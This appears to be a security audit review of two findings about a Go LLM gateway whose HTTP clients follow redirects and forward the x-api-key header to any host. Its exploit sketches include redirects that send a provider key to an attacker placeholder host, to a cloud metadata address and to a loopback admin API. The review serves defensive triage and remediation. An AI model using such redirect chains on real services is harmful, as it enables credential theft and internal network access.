title: CONFIRMED AS MEDIUM (not high): gateway/health/admin HTTP clients set no CheckRedirect, so x-api-key — absent from Go's cross-host redirect strip list — is replayed verbatim to an arbitrary redirect target; but the filed 'key exfiltration by malicious upstream' chain is not an escalation because that upstream already receives the key on every request
evidence: Citation integrity verified exact. adapter.go:679 `req.Header.Set("x-api-key", apiKey)` (anthropic-version at :680); gateway.go:58-60 `httpClient: &http.Client{Transport: &http.Transport{` / `MaxIdleConns: 200, MaxIdleConnsPerHost: 64, IdleConnTimeout: 90 * time.Second,` — no CheckRedirect; used at gateway.go:517 `resp, err := s.httpClient.Do(req)` for the request built at gateway.go:507 `adapter.BuildUpstreamRequest(up.Protocol, cr, up.UpstreamModel, up.BaseURL, up.APIKey)`; health.go:38 `client: &http.Client{Timeout: 10 * time.Second}}`; providers.go:184 and :232 `client := &http.Client{Timeout: 15 * time.Second}` (x-api-key at providers.go:177 and :230); snapshot plaintext from manager.go:214-215 `if plain, err := m.enc.Decrypt(p.APIKeyEnc); err == nil {` / `p.APIKey = plain`. Repo-wide grep: `CheckRedirect` appears in zero Go files under backend/. Stdlib verified against the installed toolchain (go1.24.4 windows/amd64, GOROOT C:\Program Files\Go; go.mod `go 1.25`): client.go:819-824 default 10-hop limit; client.go:808-809 sensitive list `case "Authorization", "Www-Authenticate", "Cookie", "Cookie2",` / `"Proxy-Authorization", "Proxy-Authenticate":` (x-api-key not in it); client.go:812-814 `if !(sensitive && stripSensitiveHeaders) { req.Header[k] = vv }`; client.go:682-686 cross-host decision; client.go:991-1007/:1014-1031 sub-domain allowance; client.go:669-675 body replay via GetBody, which adapter.go:674 `bytes.NewReader(b)` guarantees.
impact: Surviving impact (real): an admin-provisioned Anthropic provider key — the one credential class with no read-back path (model.go:107-109 `APIKey string `gorm:"-" json:"-"``; providers.go:22 `APIKey string `json:"-" // 不输出明文``; cleared at providers.go:81/:130) — plus, on 307/308, the tenant's full prompt body, can be replayed by the gateway to any http/https host the upstream names, up to 10 hops, including RFC1918/loopback/link-local since gateway.go:58-61 sets no DialContext/IP pinning, and silently because gateway.go:529 `if resp.StatusCode < 200 || resp.StatusCode >= 300 {` inspects only the final response. The openai_* paths are spared only by the stdlib accident that they use Authorization (adapter.go:560), so the asymmetry is genuine. Why not high: (a) the named adversary — a malicious/compromised Anthropic-protocol upstream — already receives `x-api-key` and the whole prompt in the INITIAL request of every call, so a redirect gives it nothing new; (b) leaking to a third-party host requires the upstream to redirect for unrelated reasons (provider compromise, open redirect on its own origin, cleartext http:// base_url where the key is already visible) — none demonstrated, and mitigations_checked itself concedes 'no redirect observed in normal provider traffic'; (c) no amplification: inbound tenant keys are never forwarded (fresh http.NewRequest at adapter.go:555/:674; only X-Request-ID added at gateway.go:514) and each failover attempt builds its own per-provider request (gateway.go:447-463), so blast radius is one provider key; (d) the redirect-into-internal-space half duplicates gateway-3 (medium), which already cites it: 'redirect-based internal reach compounds this (see gateway-2)'.
reason: All quoted lines match exactly and every stdlib assertion reproduced against the real toolchain, so the finding cannot be refuted on evidence; but its escalation premise fails — the attacker described is already the intended recipient of the credential — which is precisely the 'attacker already has the privilege' break. What remains is a textbook missing-CheckRedirect / non-standard-auth-header defense-in-depth gap: real, locatable, silently repeatable, with no egress or hop validation anywhere in the request path. That is the rubric's medium ('defense-in-depth gap w/ real impact'), and it also avoids double-counting gateway-3's SSRF. Recommendation from the original report stands as written.
exploit_sketch: Precondition (not established by the report): the redirect must come from a host that is not itself the attacker. 1) Admin POSTs /api/admin/v1/providers {"protocol":"anthropic","base_url":"https://reseller.example/claude","api_key":"sk-ant-..."} — accepted because providers.go:56 checks only non-emptiness. 2) Tenant POSTs /v1/messages; gateway.go:507 → adapter.go:679 attach `x-api-key: sk-ant-...`. 3) reseller.example replies `302 Location: https://collector.attacker.example/c`; gateway.go:58's client follows it (client.go:819-824) and client.go:808-814 copies x-api-key because it is not in the sensitive list. 4) The attacker host receives the provider key; a 307 instead re-POSTs the tenant prompt (GetBody from adapter.go:674) and its 200 JSON passes gateway.go:529 as a normal completion, so audit/metrics show no anomaly. Variant: `Location: http://169.254.169.254/...` or `http://127.0.0.1:8788/api/admin/v1/...` is dialed with the key attached (no dial-time range guard).
recommendation: (1) gateway.go:58: `CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }` so any 3xx surfaces at gateway.go:529 and triggers failover; (2) apply the same to health.go:38, providers.go:184, providers.go:232; (3) alternatively/additionally re-validate scheme + host-change + private/loopback/link-local ranges per hop and Del("x-api-key")/Del("anthropic-version") whenever hop Host != reqs[0].URL.Host, mirroring client.go:808-814; (4) fold the egress guard (base_url scheme/IP-range validation, dial-time pinning) into gateway-3's remediation rather than filing it twice.
mitigations_checked: Go strips Authorization cross-host (client.go:808-814) → openai_chat/openai_responses upstream keys and the health-probe key are protected; redirect count capped at 10; non-stream path bounded by gateway.go:497-505 timeout and client timeouts at health.go:38/providers.go:184/:232; unsupported schemes refused by net/http; AES-GCM at rest (crypto.go:34-41); no admin plaintext read-back; no tenant-credential or cross-provider contamination; gateway.go:526/529 confirm the followed hop is invisible, so 'silent and persistent' is accurate.

title: Sub-claim refuted: the health checker does NOT replay the provider key to a cross-host redirect target (it sends Authorization, which stdlib strips) and does not run every 3-10s (default 30s)
evidence: health.go:103-105: `if k := c.apiKey(p); k != "" {` / `req.Header.Set("Authorization", "Bearer "+k)` / `}` — the probe never sets x-api-key, for Anthropic providers included. In the redirect case the finding posits (`Location: https://attacker.example/collect`, i.e. a different Host from reqs[0].URL.Host), client.go:682-686 `if !stripSensitiveHeaders && reqs[0].URL.Host != req.URL.Host { if !shouldCopyHeaderOnRedirect(...) { stripSensitiveHeaders = true } }` plus client.go:808-814 removes Authorization from the forwarded headers, so nothing credential-bearing leaves the origin host. Cadence: config.go:71 `HealthCheckSeconds: getenvInt("HEALTH_CHECK_SECONDS", 30),` (config.go:24 documents '0=disabled; default 30'), wired at cmd/server/main.go:79 `util.SafeGo("health.Run", func() { health.New(gdb, enc, bl).Run(ctx, time.Duration(cfg.HealthCheckSeconds)*time.Second) })` — 30s, not 3-10s (the 3s figure is hot_reload_seconds, manager.go:169-175).
impact: No security impact; recorded so the audit trail corrects the composite 'every generation AND every 3-10s health probe' exfiltration narrative that partly justified the high rating. Note the same file also means health probes never authenticate Anthropic-protocol endpoints — benign, because the probe's success criterion is 'any HTTP response' (health.go package comment lines 5-6: 'any HTTP response (incl 401/403/404) = endpoint reachable = healthy').
reason: The evidence quote for this sub-claim ('health.go sends the decrypted key too', health.go:38) is technically true but the header name differs, and the header name is the whole basis of the cross-host-leak argument. Refuted for the cross-host vector; the subdomain/parent-domain case where stdlib keeps Authorization is intentional stdlib semantics, not a defect in this repository.
exploit_sketch: None: GET http://reseller.example/claude/v1/models → 302 https://attacker.example/c delivers no Authorization header to attacker.example (stripped at client.go:808-814).
recommendation: Still add CheckRedirect to health.go:38 for hop-count/SSRF hygiene (shared with gateway-3's egress guard), but do not treat the health probe as a credential-leak channel.
mitigations_checked: Confirmed the only admin-path probes that send x-api-key are providers.go:177 (testProvider) and providers.go:230 (probeAnthropicMessages), both authenticated-admin-triggered against a base_url that same admin just supplied (providers.go:163 `key, _ := s.enc.Decrypt(p.APIKeyEnc)`), so they add no privilege beyond the admin's own configuration choice.
